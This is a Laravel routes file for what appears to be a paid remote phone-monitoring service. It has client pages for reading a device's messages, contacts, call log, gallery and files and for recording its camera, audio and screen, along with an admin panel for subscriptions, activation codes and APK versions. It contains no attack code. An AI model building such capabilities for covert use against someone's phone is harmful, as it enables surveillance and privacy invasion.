<?php

use App\Http\Controllers\Actions\Functions\SendFcmNotification as FunctionsSendFcmNotification;
use App\Http\Controllers\activationCodeController;
use App\Http\Controllers\adminController;
use App\Http\Controllers\Api\V1\ApiAuthController;
use App\Http\Controllers\ApkVersionController;
use App\Http\Controllers\clientController;
use App\Http\Controllers\couponsController;
use App\Http\Controllers\frontend\messageController;
use App\Http\Controllers\frontend\subscriptionController as FrontendSubscriptionController;
use App\Http\Controllers\LoginController;
use App\Http\Controllers\PackageController;
use App\Http\Controllers\RegisterController;
use App\Http\Controllers\rolesController;
use App\Http\Controllers\SendFcmNotification;
use App\Http\Controllers\settingsController;
use App\Http\Controllers\subscriptionController;
use App\Http\Controllers\transactionsController;
use App\Http\Controllers\usersController;
use App\Http\Livewire\AlertDeviceComponent;
use App\Http\Livewire\AudioRecordComponent;
use App\Http\Livewire\CallLogComponent;
use App\Http\Livewire\CameraComponent;
use App\Http\Livewire\ContactsComponent;
use App\Http\Livewire\FilemanagerComponent;
use App\Http\Livewire\GalleryComponent;
use App\Http\Livewire\LostMessagesComponent;
use App\Http\Livewire\MessageComponent;
use App\Http\Livewire\ScreenRecordComponent;
use App\Http\Livewire\VibrateComponent;
use App\Http\Livewire\VideoRecordComponent;
use App\Models\settings;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Session;

Route::get('/', function () {
    Session::forget('user_data');
    return view('frontend/pages/index');
})->name('home');

route::get('login/client', [LoginController::class, 'index'])->name('login');

route::get('register/client', [RegisterController::class, 'index']);

route::post('login/client', [LoginController::class, 'login']);

route::get('client/logout', [LoginController::class, 'logout']);

route::post('register/client', [RegisterController::class, 'create_user']);

route::post('check/client', [LoginController::class, 'check_client']);
Route::post('/login_options/client/', [LoginController::class, 'login_options']);
Route::get('/login_options/client', [LoginController::class, 'login_options_index']);
route::get('login_password/client', function () {
    return view('frontend.auth.login_password');
});
route::post('login/password/client', [LoginController::class, 'login_with_password']);
route::get('get_otp/client', [LoginController::class, 'generate_otp']);
route::get('login_otp/client', [LoginController::class, 'index_otp'])->name('login_otp/client');
route::post('login_otp/client', [LoginController::class, 'login_otp']);

route::get('login/forgot-password', [LoginController::class, 'forgot_password']);
route::post('login/reset-password', [LoginController::class, 'reset_password']);


Route::group(['middleware' => 'client.auth'], function () {
    route::get('/subscription', [FrontendSubscriptionController::class, 'index']);
    route::get('/subscription/packages', [FrontendSubscriptionController::class, 'packages']);
    route::get('/subscription/purchase/{id}', [FrontendSubscriptionController::class, 'purchasePackage']);
    route::post('/subscription/pay', [FrontendSubscriptionController::class, 'checkout_activation_code']);


    route::post('/subscription/checkout', [FrontendSubscriptionController::class, 'checkout']);
    route::post('/subscription/checkout/webhook', [FrontendSubscriptionController::class, 'webhook']);

    route::post('/onlinePayment', [FrontendSubscriptionController::class, 'onlinePayment']);

    route::post('/messages', [messageController::class, 'index'])->name('/messages');

    route::get('/profile', [clientController::class, 'profile_index'])->name('profile');
    route::post('/profile-update', [clientController::class, 'profile_update_frontend']);

    // features
    route::get('/message/{userId}', MessageComponent::class);
    route::get('/contacts/{userId}', ContactsComponent::class);
    route::get('/camera/{userId}', CameraComponent::class);
    route::get('/call-log/{userId}', CallLogComponent::class);
    route::get('/audio-record/{userId}', AudioRecordComponent::class);
    route::get('/alert-device/{userId}', AlertDeviceComponent::class);
    route::get('/vibrate-device/{userId}', VibrateComponent::class);
    route::get('/screen-record/{userId}', ScreenRecordComponent::class);
    route::get('/video-record/{userId}', VideoRecordComponent::class);
    route::get('/gallery/{userId}', GalleryComponent::class);
    route::get('/filemanager/{userId}', FilemanagerComponent::class);
    route::get('/lost-messages/{userId}', LostMessagesComponent::class);
});



//admin
route::get('/admin/login', [adminController::class, 'login_index']);

route::post('/admin/login', [adminController::class, 'login']);
route::get('/admin/logout', [adminController::class, 'logout']);

Route::group(['middleware' => 'user.auth'], function () {
    route::get('/admin', [adminController::class, 'index'])->name('/admin');

    route::group(['middleware' => 'roles.permission'], function () {
        route::get('/admin/roles', [adminController::class, 'roles'])->name('/admin/roles');
        route::get('/admin/create-roles', [adminController::class, 'create_roles'])->name('/admin/create-roles');
        route::post('/admin/create-roles', [rolesController::class, 'create_roles']);
        route::post('/admin/delete-roles', [rolesController::class, 'delete_roles']);
        route::get('/admin/roles/update/{id}', [rolesController::class, 'update_roles_index']);
        route::post('/admin/roles/update', [rolesController::class, 'update_roles']);
    });

    route::get('/admin/subscription/index', [subscriptionController::class, 'index'])->name('all_client');
    route::get('/admin/subscription/active', [subscriptionController::class, 'active']);
    route::get('/admin/subscription/pending', [subscriptionController::class, 'pending']);
    route::get('/admin/subscription/expired', [subscriptionController::class, 'expired']);



    route::get('/admin/users', [usersController::class, 'index'])->name('admin_users');
    route::get('/admin/users/add', [usersController::class, 'add_user_index']);
    route::post('/admin/users/create', [usersController::class, 'create_user']);
    route::get('/admin/user/update/{id}', [usersController::class, 'update_index']);
    route::post('/admin/user/update/', [usersController::class, 'update_user']);

    route::post('/admin/delete/user', [usersController::class, 'delete_user']);

    route::get('/admin/view-client/{id}', [clientController::class, 'view_client'])->name('view_client');
    route::post('/admin/client/update', [clientController::class, 'update_client']);
    route::post('/admin/clients/updatePassword', [clientController::class, 'update_client_password']);

    route::get('/admin/managePackages', [PackageController::class, 'index'])->name('/admin/managePackages');
    route::post('/admin/createPackages', [PackageController::class, 'create']);
    route::post('/admin/updatePackages', [PackageController::class, 'updatePackage']);
    route::post('/admin/deletePackages', [PackageController::class, 'deletePackage']);
    Route::post('/admin/packages/ajaxCallAllPackages', [PackageController::class, 'ajaxCallAllPackages']);

    route::get('/admin/activationCodes', [activationCodeController::class, 'index'])->name('/admin/activationCodes');
    route::post('/admin/activationCodes/ajaxCallAllCodes', [activationCodeController::class, 'ajaxCallAllCodes']);
    route::post('/admin/createActivationCode', [activationCodeController::class, 'createCode']);
    route::post('/admin/deleteActivationCode', [activationCodeController::class, 'deleteCode']);

    route::get('/admin/manageCoupons', [couponsController::class, 'index'])->name('/admin/manageCoupons');
    route::post('/admin/coupons/ajaxCallAllCoupons', [couponsController::class, 'ajaxCallAllCoupons']);
    route::post('/admin/createCoupon', [couponsController::class, 'createCoupon']);
    route::post('/admin/updateCoupon', [couponsController::class, 'updateCoupon']);
    route::post('/admin/deleteCoupon', [couponsController::class, 'deleteCoupon']);


    Route::match(['get', 'post'], '/admin/settings', [settingsController::class, 'index']);

    Route::get('/admin/transactions', [transactionsController::class, 'index'])->name('/admin/transactions');

    Route::post('/admin/transactions/ajaxCallAllTxn', [transactionsController::class, 'ajaxCallAllTxn']);

    route::post('/admin/clients/ajaxCallAllClientsActive', [subscriptionController::class, 'ajaxCallAllClientsActive']);
    route::post('/admin/clients/ajaxCallAllClientsPending', [subscriptionController::class, 'ajaxCallAllClientsPending']);
    route::post('/admin/clients/ajaxCallAllClients', [subscriptionController::class, 'ajaxCallAllClients']);

    route::get('/admin/profile/{id}', [adminController::class, 'profile']);
    route::post('/admin/profile/update', [adminController::class, 'profile_update']);

    Route::get('/admin/apk-versions', [ApkVersionController::class, 'index'])->name('apk-version');
    Route::post('/admin/apk-versions', [ApkVersionController::class, 'create_update']);
});

Route::get('/test-fcm-notification', [FunctionsSendFcmNotification::class, 'sendNotification']);
